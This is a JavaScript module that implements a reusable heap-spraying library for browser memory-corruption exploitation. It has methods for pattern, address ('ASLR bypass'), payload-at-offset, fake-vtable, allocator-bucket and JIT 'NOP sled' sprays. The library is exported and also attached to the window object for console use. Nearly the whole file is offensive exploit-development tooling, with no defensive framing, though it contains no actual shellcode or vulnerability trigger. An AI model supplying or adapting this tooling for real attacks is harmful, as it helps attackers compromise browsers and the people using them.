/**
 * Advanced Heap Spray Utility
 * Provides specialized heap spraying techniques for different exploitation scenarios
 */

/**
 * HeapSpray class with various spraying techniques
 */
class HeapSpray {
  /**
   * Create a new heap spray utility
   * @param {Object} options - Configuration options
   */
  constructor(options = {}) {
    // Default configuration
    this.config = {
      defaultSize: 0x10000,          // 64 KB default chunk size
      defaultPattern: 0x41414141,    // AAAA
      defaultSpraySize: 256,         // Number of chunks in default spray
      maxSprayMB: 512,               // Maximum spray size (safety limit)
      typedArrayTypes: [             // Available typed array types for spray
        Uint8Array, Uint16Array, Uint32Array, Float32Array, Float64Array
      ],
      ...options
    };
    
    // Track allocations for management
    this.allocations = [];
    
    // Expose to window for console access
    if (typeof window !== 'undefined') {
      window.heapSpray = this;
    }
  }
  
  /**
   * Create a simple heap spray with a repeating pattern
   * @param {number} pattern - Pattern to repeat (e.g., 0x41414141)
   * @param {number} count - Number of chunks to allocate
   * @param {number} chunkSize - Size of each chunk in bytes
   * @returns {Array} Array of buffers
   */
  basicSpray(pattern = this.config.defaultPattern, count = this.config.defaultSpraySize, chunkSize = this.config.defaultSize) {
    this.validateSpraySize(count, chunkSize);
    console.log(`Starting basic heap spray: ${count} chunks of ${chunkSize} bytes with pattern 0x${pattern.toString(16)}`);
    
    const buffers = [];
    const totalMB = (count * chunkSize) / (1024 * 1024);
    
    // Create the typed array
    const templateArray = new Uint32Array(chunkSize / 4);
    templateArray.fill(pattern);
    
    for (let i = 0; i < count; i++) {
      // Clone the template for each allocation
      const buffer = new ArrayBuffer(chunkSize);
      const view = new Uint32Array(buffer);
      view.set(templateArray);
      
      buffers.push(buffer);
      
      // Log progress
      if (i % 100 === 0 || i === count - 1) {
        console.log(`Sprayed ${i + 1}/${count} chunks (${((i + 1) * chunkSize / (1024 * 1024)).toFixed(2)}/${totalMB.toFixed(2)} MB)`);
      }
    }
    
    this.allocations.push({
      type: 'basicSpray',
      buffers,
      pattern,
      chunkSize,
      count
    });
    
    return buffers;
  }
  
  /**
   * Spray the heap with address values (for ASLR bypass techniques)
   * @param {number} baseAddress - Base address to start from
   * @param {number} count - Number of chunks to allocate
   * @param {number} chunkSize - Size of each chunk in bytes
   * @returns {Array} Array of buffers
   */
  addressSpray(baseAddress = 0x08080808, count = this.config.defaultSpraySize, chunkSize = this.config.defaultSize) {
    this.validateSpraySize(count, chunkSize);
    console.log(`Starting address heap spray: ${count} chunks of ${chunkSize} bytes from base 0x${baseAddress.toString(16)}`);
    
    const buffers = [];
    const totalMB = (count * chunkSize) / (1024 * 1024);
    
    for (let i = 0; i < count; i++) {
      const buffer = new ArrayBuffer(chunkSize);
      const view = new Uint32Array(buffer);
      
      // Fill with incrementing addresses
      for (let j = 0; j < view.length; j++) {
        view[j] = baseAddress + (j * 4);
      }
      
      buffers.push(buffer);
      
      // Log progress
      if (i % 100 === 0 || i === count - 1) {
        console.log(`Sprayed ${i + 1}/${count} chunks (${((i + 1) * chunkSize / (1024 * 1024)).toFixed(2)}/${totalMB.toFixed(2)} MB)`);
      }
    }
    
    this.allocations.push({
      type: 'addressSpray',
      buffers,
      baseAddress,
      chunkSize,
      count
    });
    
    return buffers;
  }
  
  /**
   * Spray the heap with objects of various specific sizes
   * @param {Array} sizes - Array of sizes to spray
   * @param {number} countPerSize - Number of objects per size
   * @returns {Object} Map of sizes to arrays of buffers
   */
  sizeDiversitySpray(sizes = [32, 64, 128, 256, 512, 1024, 2048, 4096], countPerSize = 1000) {
    const result = {};
    const totalObjects = sizes.length * countPerSize;
    const totalBytes = sizes.reduce((sum, size) => sum + size * countPerSize, 0);
    
    this.validateSpraySize(totalObjects, totalBytes / totalObjects);
    console.log(`Starting size diversity spray: ${sizes.length} different sizes, ${countPerSize} objects per size`);
    console.log(`Total: ${totalObjects} objects, ${(totalBytes / (1024 * 1024)).toFixed(2)} MB`);
    
    for (const size of sizes) {
      result[size] = [];
      
      console.log(`Spraying size: ${size} bytes, count: ${countPerSize}`);
      
      for (let i = 0; i < countPerSize; i++) {
        const buffer = new ArrayBuffer(size);
        const view = new Uint8Array(buffer);
        
        // Fill with size-specific pattern
        for (let j = 0; j < size; j++) {
          view[j] = size & 0xFF;
        }
        
        result[size].push(buffer);
      }
    }
    
    this.allocations.push({
      type: 'sizeDiversitySpray',
      buffers: result,
      sizes,
      countPerSize
    });
    
    return result;
  }
  
  /**
   * Spray the heap with typed arrays of different types
   * @param {number} size - Size of each array in bytes
   * @param {number} countPerType - Number of arrays per type
   * @returns {Object} Map of types to arrays of typed arrays
   */
  typedArraySpray(size = 1024, countPerType = 100) {
    const result = {};
    const totalObjects = this.config.typedArrayTypes.length * countPerType;
    
    this.validateSpraySize(totalObjects, size);
    console.log(`Starting typed array spray: ${this.config.typedArrayTypes.length} different types, ${countPerType} objects per type`);
    
    for (const TypedArray of this.config.typedArrayTypes) {
      const typeName = TypedArray.name;
      result[typeName] = [];
      
      console.log(`Spraying ${typeName}, size: ${size} bytes, count: ${countPerType}`);
      
      for (let i = 0; i < countPerType; i++) {
        const buffer = new ArrayBuffer(size);
        const array = new TypedArray(buffer);
        
        // Fill with type-specific pattern
        const elementSize = array.BYTES_PER_ELEMENT;
        const value = elementSize === 1 ? 0xAA : 
                     elementSize === 2 ? 0xAAAA : 
                     elementSize === 4 ? 0xAAAAAAAA : 
                     0x4141414141414141;
        
        array.fill(value);
        
        result[typeName].push(array);
      }
    }
    
    this.allocations.push({
      type: 'typedArraySpray',
      buffers: result,
      size,
      countPerType
    });
    
    return result;
  }
  
  /**
   * Spray with objects containing a specific payload at a specific offset
   * @param {Uint8Array} payload - Payload bytes to include
   * @param {number} offset - Offset within the chunk
   * @param {number} count - Number of chunks to allocate
   * @param {number} chunkSize - Size of each chunk
   * @returns {Array} Array of buffers
   */
  payloadSpray(payload, offset = 8, count = this.config.defaultSpraySize, chunkSize = this.config.defaultSize) {
    if (!(payload instanceof Uint8Array)) {
      throw new Error('Payload must be a Uint8Array');
    }
    
    if (offset + payload.byteLength > chunkSize) {
      throw new Error('Payload and offset exceed chunk size');
    }
    
    this.validateSpraySize(count, chunkSize);
    console.log(`Starting payload spray: ${count} chunks of ${chunkSize} bytes with ${payload.byteLength}-byte payload at offset ${offset}`);
    
    const buffers = [];
    const totalMB = (count * chunkSize) / (1024 * 1024);
    
    // Create template buffer
    const templateBuffer = new ArrayBuffer(chunkSize);
    const templateView = new Uint8Array(templateBuffer);
    
    // Fill with a pattern
    templateView.fill(0xAA);
    
    // Insert payload at specified offset
    templateView.set(payload, offset);
    
    for (let i = 0; i < count; i++) {
      // Clone the template
      const buffer = new ArrayBuffer(chunkSize);
      const view = new Uint8Array(buffer);
      view.set(templateView);
      
      buffers.push(buffer);
      
      // Log progress
      if (i % 100 === 0 || i === count - 1) {
        console.log(`Sprayed ${i + 1}/${count} chunks (${((i + 1) * chunkSize / (1024 * 1024)).toFixed(2)}/${totalMB.toFixed(2)} MB)`);
      }
    }
    
    this.allocations.push({
      type: 'payloadSpray',
      buffers,
      payloadSize: payload.byteLength,
      offset,
      chunkSize,
      count
    });
    
    return buffers;
  }
  
  /**
   * Spray the heap with objects containing fake vtables
   * @param {Array} vtable - Array of function pointers (numbers)
   * @param {number} count - Number of objects to allocate
   * @param {number} chunkSize - Size of each chunk
   * @returns {Array} Array of buffers
   */
  vtableSpray(vtable = [0x41414141, 0x42424242, 0x43434343, 0x44444444], count = this.config.defaultSpraySize, chunkSize = this.config.defaultSize) {
    this.validateSpraySize(count, chunkSize);
    console.log(`Starting vtable spray: ${count} chunks of ${chunkSize} bytes with vtable of ${vtable.length} entries`);
    
    const buffers = [];
    const totalMB = (count * chunkSize) / (1024 * 1024);
    
    for (let i = 0; i < count; i++) {
      const buffer = new ArrayBuffer(chunkSize);
      const view = new Uint32Array(buffer);
      
      // First 4 bytes: vtable pointer (pointing to offset 8)
      view[0] = 8;
      
      // At offset 8: the vtable entries
      for (let j = 0; j < vtable.length; j++) {
        view[2 + j] = vtable[j];
      }
      
      // Fill the rest with a pattern
      for (let j = 2 + vtable.length; j < view.length; j++) {
        view[j] = 0xCAFEBABE;
      }
      
      buffers.push(buffer);
      
      // Log progress
      if (i % 100 === 0 || i === count - 1) {
        console.log(`Sprayed ${i + 1}/${count} chunks (${((i + 1) * chunkSize / (1024 * 1024)).toFixed(2)}/${totalMB.toFixed(2)} MB)`);
      }
    }
    
    this.allocations.push({
      type: 'vtableSpray',
      buffers,
      vtableLength: vtable.length,
      chunkSize,
      count
    });
    
    return buffers;
  }
  
  /**
   * Create a targeted spray to occupy specific buckets
   * @param {Array} bucketSizes - Array of bucket sizes to target
   * @param {number} count - Number of objects per bucket
   * @returns {Object} Map of bucket sizes to arrays of buffers
   */
  bucketTargetedSpray(bucketSizes = [32, 64, 128, 256, 512, 1024], count = 100) {
    const result = {};
    const totalObjects = bucketSizes.length * count;
    
    console.log(`Starting bucket-targeted spray: ${bucketSizes.length} buckets, ${count} objects per bucket`);
    
    for (const size of bucketSizes) {
      result[size] = [];
      
      console.log(`Targeting bucket: ${size} bytes, count: ${count}`);
      
      for (let i = 0; i < count; i++) {
        // Create an object slightly smaller than the bucket
        // to ensure it lands in the right bucket
        const allocSize = size - 8;
        const buffer = new ArrayBuffer(allocSize > 0 ? allocSize : size);
        const view = new Uint8Array(buffer);
        
        // Fill with bucket-specific pattern
        for (let j = 0; j < view.length; j++) {
          view[j] = size & 0xFF;
        }
        
        result[size].push(buffer);
      }
    }
    
    this.allocations.push({
      type: 'bucketTargetedSpray',
      buffers: result,
      bucketSizes,
      count
    });
    
    return result;
  }
  
  /**
   * Create a JIT page spray targeting code pages
   * @param {number} count - Number of function instances to create
   * @returns {Array} Array of functions
   */
  jitSpray(count = 100) {
    console.log(`Starting JIT spray: ${count} functions`);
    
    const functions = [];
    const nopSledLength = 100;
    
    // Construct a NOP sled string
    const nopSled = Array(nopSledLength).fill('1').join('+');
    
    for (let i = 0; i < count; i++) {
      // Create a unique function with a large NOP sled to force JIT compilation
      // We use addition operations that compile to single-byte instructions
      const functionBody = `
        // NOP sled via addition operations
        let x = ${nopSled};
        
        // Shellcode-like pattern at the end
        x = 0xCCCCCCCC;
        return x;
      `;
      
      try {
        const fn = new Function(functionBody);
        
        // Call the function to trigger JIT compilation
        fn();
        
        functions.push(fn);
      } catch (e) {
        console.error('Error in JIT spray:', e);
      }
      
      // Log progress
      if (i % 20 === 0 || i === count - 1) {
        console.log(`Created ${i + 1}/${count} JIT functions`);
      }
    }
    
    this.allocations.push({
      type: 'jitSpray',
      functions,
      count
    });
    
    return functions;
  }
  
  /**
   * Spray using ES6 typed objects with specific layout
   * @param {Object} layout - Object describing the desired memory layout
   * @param {number} count - Number of objects to create
   * @returns {Array} Array of objects
   */
  structuredObjectSpray(layout = { a: 'AAAA', b: 0x41414141, c: [1, 2, 3, 4] }, count = 1000) {
    console.log(`Starting structured object spray: ${count} objects with custom layout`);
    
    const objects = [];
    
    for (let i = 0; i < count; i++) {
      // Clone the layout for each object
      const obj = JSON.parse(JSON.stringify(layout));
      
      // Add a unique identifier
      obj.id = i;
      
      objects.push(obj);
      
      // Log progress
      if (i % 200 === 0 || i === count - 1) {
        console.log(`Created ${i + 1}/${count} structured objects`);
      }
    }
    
    this.allocations.push({
      type: 'structuredObjectSpray',
      objects,
      layout,
      count
    });
    
    return objects;
  }
  
  /**
   * Spray ArrayBuffers and then create views with different offsets
   * @param {number} bufferSize - Size of each ArrayBuffer
   * @param {number} bufferCount - Number of ArrayBuffers to create
   * @param {number} viewsPerBuffer - Number of views per buffer
   * @returns {Object} Map of buffers to arrays of views
   */
  arrayBufferViewSpray(bufferSize = 1024 * 64, bufferCount = 50, viewsPerBuffer = 20) {
    this.validateSpraySize(bufferCount, bufferSize);
    console.log(`Starting ArrayBuffer view spray: ${bufferCount} buffers of ${bufferSize} bytes with ${viewsPerBuffer} views each`);
    
    const result = new Map();
    const totalMB = (bufferCount * bufferSize) / (1024 * 1024);
    
    for (let i = 0; i < bufferCount; i++) {
      const buffer = new ArrayBuffer(bufferSize);
      const baseView = new Uint8Array(buffer);
      
      // Fill buffer with a pattern
      for (let j = 0; j < baseView.length; j++) {
        baseView[j] = j & 0xFF;
      }
      
      // Create multiple views at different offsets
      const views = [];
      for (let j = 0; j < viewsPerBuffer; j++) {
        const offset = Math.floor(j * bufferSize / viewsPerBuffer);
        const size = Math.floor(bufferSize / viewsPerBuffer);
        
        if (offset + size <= bufferSize) {
          const view = new Uint8Array(buffer, offset, size);
          views.push(view);
        }
      }
      
      result.set(buffer, views);
      
      // Log progress
      if (i % 10 === 0 || i === bufferCount - 1) {
        console.log(`Sprayed ${i + 1}/${bufferCount} buffers with ${views.length} views each (${((i + 1) * bufferSize / (1024 * 1024)).toFixed(2)}/${totalMB.toFixed(2)} MB)`);
      }
    }
    
    this.allocations.push({
      type: 'arrayBufferViewSpray',
      result,
      bufferSize,
      bufferCount,
      viewsPerBuffer
    });
    
    return result;
  }
  
  /**
   * Create memory pressure to force GC
   * @param {number} sizeMB - Size in MB to allocate
   */
  createMemoryPressure(sizeMB = 100) {
    console.log(`Creating memory pressure: ${sizeMB} MB`);
    
    const arrays = [];
    const chunkSize = 1024 * 1024; // 1 MB
    
    for (let i = 0; i < sizeMB; i++) {
      const array = new Uint8Array(chunkSize);
      // Fill with data to prevent optimization
      for (let j = 0; j < chunkSize; j += 4096) {
        array[j] = j & 0xFF;
      }
      arrays.push(array);
      
      // Log progress for large allocations
      if (sizeMB > 20 && (i % 20 === 0 || i === sizeMB - 1)) {
        console.log(`Allocated ${i + 1}/${sizeMB} MB for pressure`);
      }
    }
    
    console.log(`Memory pressure created: ${arrays.length} arrays, ${sizeMB} MB`);
    
    // Hold for a moment, then release
    setTimeout(() => {
      console.log('Releasing memory pressure...');
      arrays.length = 0;
    }, 100);
  }
  
  /**
   * Clear all allocations
   */
  clear() {
    console.log(`Clearing ${this.allocations.length} spray allocations`);
    this.allocations.length = 0;
    
    // Force garbage collection if available
    if (typeof window !== 'undefined' && window.gc) {
      window.gc();
    } else {
      this.createMemoryPressure(200);
    }
  }
  
  /**
   * Validate spray size to prevent browser crashes
   * @private
   */
  validateSpraySize(count, size) {
    const totalMB = (count * size) / (1024 * 1024);
    if (totalMB > this.config.maxSprayMB) {
      throw new Error(`Spray size exceeds maximum allowed (${totalMB.toFixed(2)} MB > ${this.config.maxSprayMB} MB)`);
    }
  }
  
  /**
   * Create a custom spray using a generator function
   * @param {Function} generator - Function that returns an object
   * @param {number} count - Number of objects to create
   * @returns {Array} Array of objects
   */
  customSpray(generator, count = 1000) {
    if (typeof generator !== 'function') {
      throw new Error('Generator must be a function');
    }
    
    console.log(`Starting custom spray with ${count} objects`);
    
    const objects = [];
    
    for (let i = 0; i < count; i++) {
      try {
        const obj = generator(i);
        objects.push(obj);
      } catch (e) {
        console.error(`Error in custom spray at index ${i}:`, e);
      }
      
      // Log progress
      if (i % 200 === 0 || i === count - 1) {
        console.log(`Created ${i + 1}/${count} custom objects`);
      }
    }
    
    this.allocations.push({
      type: 'customSpray',
      objects,
      count
    });
    
    return objects;
  }
}

// Export the heap spray utility
export default HeapSpray;
